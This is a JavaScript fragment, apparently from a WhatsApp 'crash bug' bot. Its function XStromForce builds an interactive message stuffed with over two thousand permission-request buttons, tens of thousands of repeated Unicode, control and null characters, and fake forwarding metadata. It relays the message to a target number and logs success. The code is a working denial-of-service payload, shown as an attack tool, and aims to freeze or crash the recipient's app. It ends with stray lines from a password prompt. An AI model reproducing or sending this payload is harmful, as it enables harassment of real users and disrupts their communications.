  async function XStromForce(target) {
  let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
    for (let i = 0; i < 2000; i++) {
      buttonsFreze.push({
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    
    buttonsFreze.push({
      name: "call_permission_request",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
  
    const biji = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           body: {
             text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ",
            },
            footer: {
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ",
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: Array(50).fill("0@s.whatsapp.net"),
              quotedMessage: {
              externalAdReply: {
                title: "ꦾ".repeat(77777),
                body: "\x10".repeat(50000),
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/zyyimupp"
                },
              },
              forwardingScore: 999,
              isForwarded: true
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamJson: JSON.stringify({
                title: "ꦾ".repeat(77777),
                description: "\x10".repeat(25000),
                metadata: {
                junk: "\u0000".repeat(25000)
              }
            })
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(biji), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
   console.log(chalk.red(`Succes Sending Bug Force By XStrom-Flower To ${target}`));
}
  rl.close();
  console.log(chalk.bold.red("✅ PASSWORD BENAR"));
});
